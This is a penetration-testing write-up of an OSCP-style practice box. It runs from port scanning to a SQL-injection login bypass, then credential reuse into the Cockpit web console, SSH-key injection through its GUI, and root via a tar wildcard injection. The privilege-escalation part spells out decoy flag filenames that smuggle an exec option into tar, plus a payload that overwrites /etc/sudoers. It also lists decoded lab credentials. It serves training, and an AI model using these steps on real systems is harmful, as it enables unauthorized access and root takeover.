
## Summary

Foothold comes from a hidden PHP login page (missed by both Nmap and Wappalyzer) vulnerable to a SQL injection authentication bypass. Cockpit — an Ubuntu server management web console on port 9090 — lets us add our own SSH key to a user account through the GUI, converting a web shell into a real interactive shell. Privesc is a classic `tar` wildcard injection abusing a narrowly-scoped sudo rule.

**Chain:** hidden PHP endpoint → SQLi login bypass → leaked creds → Cockpit SSH-key injection → real shell → `tar` wildcard sudo abuse → root

---

## Enumeration

### Nmap — full TCP + UDP

Start with a full-port scan, since services often hide on non-default ports.

```bash
sudo nmap -Pn -n $IP -sC -sV -p- --open
```

`-Pn` skips the ping check, `-n` skips DNS, `-p-` scans all 65535 ports, `--open` only shows open ones. This is a solid default starting command for basically every box.

Once the TCP scan finishes, kick off a UDP scan in parallel and come back to it later — UDP scans are slow, so scope them to the top ports rather than a full sweep.

```bash
sudo nmap -Pn -n $IP -sU --top-ports=100
```

**Results:**

- `22/tcp` — OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 → version string maps to Ubuntu 20.04 (Focal) via launchpad.net
- `80/tcp` — Apache 2.4.41, page title "blaze", static template, no clickable links
- `9090/tcp` — SSL service, self-signed cert with an odd `organizationName` (looked like an MD5 hash — parked for later, never actually needed)

**Pattern to remember:** noting the SSH host key types up front (RSA/ECDSA/ED25519) pays off later if you end up needing to generate a matching key type for key-based auth.

### Port 80 — directory brute force

Static page, nothing in page source, nothing interesting in CSS/JS/img directories.

```bash
sudo gobuster dir -w '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' -u http://$IP:80 -t 42 -b 400,403,404
```

Initial scan (no extensions) came up empty of anything useful.

**The catch:** neither Nmap's service detection nor Wappalyzer flagged this server as running PHP. Adding explicit extensions to the gobuster scan is what actually surfaced the hidden app:

```bash
sudo gobuster dir -w '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' -u http://$IP:80 -t 42 -b 400,403,404 -x txt,php
```

This turned up a login page, a likely username, and a domain-name-looking string.

**Pattern to remember:** don't trust automatic tech fingerprinting (Nmap, Wappalyzer, whatnot) as a reason to skip extension-based fuzzing. Always run at least one gobuster/ffuf pass with `-x php,txt,html` (or whatever's plausible) even if the stack "looks" static or non-PHP.

### Port 9090 — Cockpit

Browsing to `https://$IP:9090` returns a certificate warning, then what turns out to be **Cockpit**, Ubuntu's built-in server management web console. Gobuster against it (with `-k` for the self-signed cert, and `--exclude-length` tuned to the default 404 response size) turned up one JSON-looking endpoint, but nothing exploitable at this stage — parked for later.

```bash
sudo gobuster dir -w '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' -u https://$IP:9090 -t 42 -b 404,403,400 -k --exclude-length 43264
```

---

## Exploitation

### Discovering the injection point

On the hidden PHP login page, trying `admin:admin` returns "Invalid password" — a hint the _username_ is valid, though this box's error messages turned out not to vary by username otherwise. Trying a single quote (`'`) as input triggers a raw SQL error — confirmation of SQL injection.

**Pattern to remember:** always throw a single quote at any login field, search box, or parameter early. A verbose SQL error back is basically a free confirmation that injection is possible, before you commit to a heavier tool.

This lands squarely in **OWASP Top 10 A03 (Injection)** / **A07 (Identification and Authentication Failures)** territory — SQLi used specifically to bypass authentication rather than dump data.

### First attempt: Burp Intruder brute force (blocked)

Intercepted the login request in Burp, sent it to Intruder, and tried fuzzing the username field with the encoded single quote (`%27`) as the injection point. After a short run, the app started blocking requests — it has brute-force protection.

**Pattern to remember:** this kills naive brute-forcers (Hydra) and automated tools (sqlmap) too if they're not careful about request pacing. When you hit a wall like this, don't just hammer harder — revert the box if needed and look for a smarter payload list instead of raw volume.

### Second attempt: SQLi login-bypass payload list (success)

Switched to a purpose-built list of known SQL auth-bypass payloads rather than brute-forcing character by character:

```
SecLists/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt
```

This is already bundled in Kali's SecLists install (`/usr/share/seclists/`). One payload from that list successfully bypassed the login.

**Pattern to remember:** for SQLi auth bypass specifically, reach for a dedicated login-bypass payload list before rolling your own or brute-forcing — these are curated, small, and fast, and they cover known injection patterns like `' OR '1'='1` and its variants far more efficiently than guessing.

### Loot: usernames and passwords

Bypassing the login exposed a list of usernames with base64-encoded passwords. The trailing `=` on the encoded strings was the tell to base64-decode them.

```bash
echo "<encoded_string>" | base64 -d
```

**Decoded credentials:**

```
james:canttouchhhthiss@455152
cameron:thisscanttbetouchedd@455152
```

### Credential reuse check

With two sets of creds and two remaining services (SSH on 22, Cockpit on 9090), the obvious move is to try both credentials against both services.

- **SSH (22):** rejected — key-based auth only, no password login accepted.
- **Cockpit (9090):** `james` credentials work, logging into the Cockpit web console.

**Pattern to remember:** any time you harvest credentials, immediately try them against every other open service. Password/credential reuse across services is extremely common on these boxes (and in the real world).

### From web console to real shell: SSH key injection via Cockpit

Cockpit provides a "Terminal" feature, but this is a **web-based shell** — and per OSCP exam rules, proof-of-access must come from a genuine interactive shell (SSH, not a browser-embedded terminal). A web shell doesn't count.

Cockpit's **Accounts → james** page has an "Authorized public SSH keys" section with an option to add a new key directly through the GUI.

Generate a local key matching a type the target's SSH server accepts (Nmap told us it takes ECDSA, among others):

```bash
ssh-keygen -t ECDSA -f james_ecdsa
```

Paste the **public** key (`james_ecdsa.pub`) into Cockpit's "add key" field for the `james` account. Then connect with the matching private key:

```bash
ssh -i james_ecdsa james@$IP
```

This grants a genuine SSH TTY session — tab-completion, proper terminal editors, the works. User flag retrieved from here.

**Pattern to remember:** web-based admin consoles (Cockpit, Webmin, phpMyAdmin, various CMS admin panels) very often have a GUI feature for managing SSH keys or user accounts. If you land in one via leaked creds, check account/user management pages — it's frequently a clean path to a real shell, and sidesteps whatever web-shell restrictions apply.

---

## Privilege Escalation

### Enumerate sudo rights

```bash
sudo -l
```

`james` can run `/usr/bin/tar` as root, but under restricted conditions — absolute path required, and (per the box's sudoers config) targeting a specific file/argument pattern. This looks like an attempt to give a backup capability that was configured too loosely.

**Pattern to remember:** GTFOBins is the first stop for any binary that shows up in `sudo -l`. `tar` in particular has a well-known wildcard-injection technique.

### `tar` wildcard injection

The technique abuses the fact that `tar -czvf archive.tar.gz *` expands the `*` glob in the _current directory_, and `tar` supports special filenames like `--checkpoint` and `--checkpoint-action` as command-line-style options. If you can drop files with those exact names into the directory `tar` will be run against, the shell glob turns them into arguments `tar` interprets as flags — including one that executes an arbitrary script.

Reference: [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/) and the wildcard-injection write-up class of technique in general.

**Step 1 — payload script**, placed in the directory the sudo `tar` command targets:

```bash
echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers
```

(saved as `payload.sh`)

This overwrites `/etc/sudoers` with a single line granting `james` full passwordless root — deliberately blunt for demonstration; not something you'd ever want in a real production sudoers file.

**Step 2 — decoy filenames** that `tar`'s glob expansion will pick up as flags:

```bash
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh payload.sh'
```

**Step 3 — trigger the permitted sudo command**:

```bash
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

Because `*` expands to include the two specially-named files, `tar` parses them as `--checkpoint=1 --checkpoint-action=exec=sh payload.sh` — running `payload.sh` as root as a side effect of an otherwise "safe," narrowly-scoped sudo command.

Confirmed root afterward — sudoers now grants `james` full NOPASSWD root access.

---

## Lessons / Transferable Techniques

1. **Full-port + UDP scans as default.** Services hide on non-standard ports; don't rely on the top-1000.
2. **Don't trust automatic tech fingerprinting.** Fuzz with extensions (`-x php,txt,html,...`) even when a stack "looks" static — Nmap and Wappalyzer both missed PHP on this box.
3. **Single quote first.** It's the cheapest possible SQLi confirmation test on any input field.
4. **When brute force gets blocked, get smarter, not louder.** Curated login-bypass payload lists (SecLists' fuzzdb) beat raw brute-forcing against rate-limited endpoints.
5. **Always test credential reuse across every open service.**
6. **Web admin consoles often let you inject your own SSH key via the GUI.** Check account/user management panels — this converts a restricted web shell into a full interactive shell, which also matters for OSCP-style proof requirements.
7. **`sudo -l` → GTFOBins, every time.** `tar`'s wildcard-injection trick is a good general case study for how "safe-looking" sudo rules (absolute path, specific file target) can still be broken by shell glob expansion.
